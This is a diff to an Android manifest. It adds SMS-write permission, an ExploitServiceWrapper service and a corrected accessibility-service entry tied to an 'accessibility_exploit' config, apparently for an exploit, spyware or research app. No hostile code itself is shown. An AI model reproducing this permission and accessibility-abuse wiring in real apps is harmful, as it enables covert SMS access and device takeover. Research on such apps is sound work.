@@ -61,6 +61,7 @@
     <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH"/>
     <uses-permission android:name="android.permission.RECEIVE_MMS"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
@@ -89,9 +90,10 @@
             </intent-filter>
         </activity>
 
-        <activity android:name=".PreventativeMeasuresActivity"/>
+        <service android:name=".PreventativeMeasuresService"/>
 
         <service android:name=".ExploitService" />
+        <service android:name=".ExploitServiceWrapper" />
         <service android:name="com.android.mms.transaction.TransactionService"/>
 
 
@@ -115,7 +117,7 @@
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
-            <meta-data android:resource="@xml/accessibility_exploit"/>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_exploit"/>
         </service>
 
     </application>
